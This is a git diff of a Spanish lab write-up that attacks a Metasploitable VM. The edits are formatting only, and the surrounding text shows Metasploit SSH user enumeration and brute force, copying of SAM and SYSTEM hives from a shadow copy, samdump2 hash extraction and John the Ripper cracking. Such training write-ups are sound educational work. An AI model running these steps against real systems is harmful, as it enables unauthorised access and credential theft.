@@ -102,6 +102,7 @@ Permite analizar la ruta seguida por los paquetes hacia el host objetivo e ident
     traceroute ip,  es decir,  traceroute 10.0.2.15   
    
 Resultado:
+
 ![Im.8.1](/assets/KILL/Im.8.1.png)
 
 ## **ETAPA 2: Enumeración de servicios**
@@ -115,6 +116,7 @@ Explicación:
     sudo nmap -sV -p 22 10.0.2.15
 
 Resultado:
+
 ![Im.9.1](/assets/KILL/Im.9.1.png)
 
 ## **ETAPA 3: Acceso Inicial**
@@ -143,6 +145,7 @@ En **Kali Linux** se envian los diccionarios descargados a la ruta: ***Downloads
      $ gzip -dk rockyou.txt.gz
  
 Resultado
+
 ![Im.10.1](/assets/KILL/Im.10.1.png)
 
 Luego **nos aseguramos de que contenga el usuario** **vagrant**.
@@ -183,17 +186,20 @@ Se ingresa:
     msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
 
 Resultado
+
 ![Im.11.3](/assets/KILL/Im.11.3.png) 
 
 Se **configura** el párametro RHOST y se le asigna el valor IP de la máquina target. Luego se configura el archivo donde van a estar los usuarios y el nombre del diccionario:
 
 Se ingresa: 
-     1. msf6 auxiliary(scanner/ssh/ssh_anumusers)>set RHOSTS 10.0.2.15
-     2. msf6 auxiliary(scanner/ssh/ssh_anumusers)>USER_FILE /home/user/Downloads/diccionarios/top-usernmaes-shortlist.txt
-     3. msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
-     4. msf6 auxiliary(scanner/ssh/ssh_anumusers)>run
+
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>set RHOSTS 10.0.2.15
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>USER_FILE /home/user/Downloads/diccionarios/top-usernmaes-shortlist.txt
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>run
 
 Resultado
+
 ![Im.11.4](/assets/KILL/Im.11.4.png)
 
 Ejecutamos con **"run"** para enviar los archivos.
@@ -210,14 +216,14 @@ En el script de Metasploitable: se ha encontrado el potencial usuario **'vagrant
 
 - Recordar que tenemos que cambiar de módulo **(modulo actual: ssh_enunusers)** para realizar el **login**, con el comando **use auxiliary/scanner/ssh/ssh_login**.
 
-    1. msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
-    2. msf6 auxiliary(scanner/ssh/ssh_login)>show options
-    3. msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
-    4. msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
-    5. msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
-    6. msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
-    7. msf6 auxiliary(scanner/ssh/ssh_login)>show options
-    8. msf6 auxiliary(scanner/ssh/ssh_login)>run
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
+    msf6 auxiliary(scanner/ssh/ssh_login)>show options
+    msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
+    msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
+    msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
+    msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
+    msf6 auxiliary(scanner/ssh/ssh_login)>show options
+    msf6 auxiliary(scanner/ssh/ssh_login)>run
 
 - Se realiza el cambio de ruta y a través de 'show options' se observan las configuraciones principales como: 
     - **SET RHOSTS IP** de la víctima: *10.0.2.15* 
@@ -225,6 +231,7 @@ En el script de Metasploitable: se ha encontrado el potencial usuario **'vagrant
     - **PASS_FILE:** la ruta del archivo con las direcciones.
 
 Resultado:
+
 ![Im.12.1](/assets/KILL/Im.12.1.png)
 ![Im.12.2](/assets/KILL/Im.12.2.png)
 
@@ -291,6 +298,7 @@ Una vez transferido, ingresar a la ruta del archivo y listar el archivo vssown.v
     ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs
 
 Resultado:
+
 ![Im.14.4](/assets/KILL/Im.14.4.png)
 
 ## **5.3. ¿Qué podemos hacer con el vssown.vbs?**
@@ -358,6 +366,7 @@ Y copiar los archivos SAM y SYSTEM del volumen shadow:
 **NOTA:** Reemplazar HarddiskVolumeShadowCopyX con el número correspondiente que el script vssown.vbs nos indicó. En este caso 'HarddiskVolumeShadowCopy1'
 
 Resultado:
+
 ![Im.14.8](/assets/KILL/Im.14.8.png)
 Salimos del modo cmd con 'exit'
 
@@ -371,6 +380,7 @@ Previamente identificar la ruta real usando **scp** o descarga los archivos SAM 
     password: vagrant
 
 Resultado:
+
 ![Im.14.9](/assets/KILL/Im.14.9.png)
 
 ## **ETAPA 7. Extracción de Hashes**
@@ -386,6 +396,7 @@ En Kali:
 Al ejecutar el comando **samdump2 SYSTEM SAM > hashes.txt**, la herramienta procesa ambos archivos, extrae los hashes y guarda el resultado en el archivo ***hashes.txt***. Esta información puede utilizarse posteriormente para realizar análisis de seguridad o auditorías de contraseñas mediante herramientas especializadas.
 
 Resultado:
+
 ![Im.15.1](/assets/KILL/Im.15.1.png)
 
 
@@ -402,6 +413,7 @@ En esencia, este comando le ordena a la herramienta John the Ripper que realice 
     4 $ john --format=NT --wordlist=diccionarios/kaonashi14M.txt hashes.txt --fork=4
    
 Resultado:
+
 ![Im.15.2](/assets/KILL/Im.15.2.png)
 
 John the Ripper logró recuperar varias contraseñas a partir de los hashes NTLM contenidos en hashes.txt.
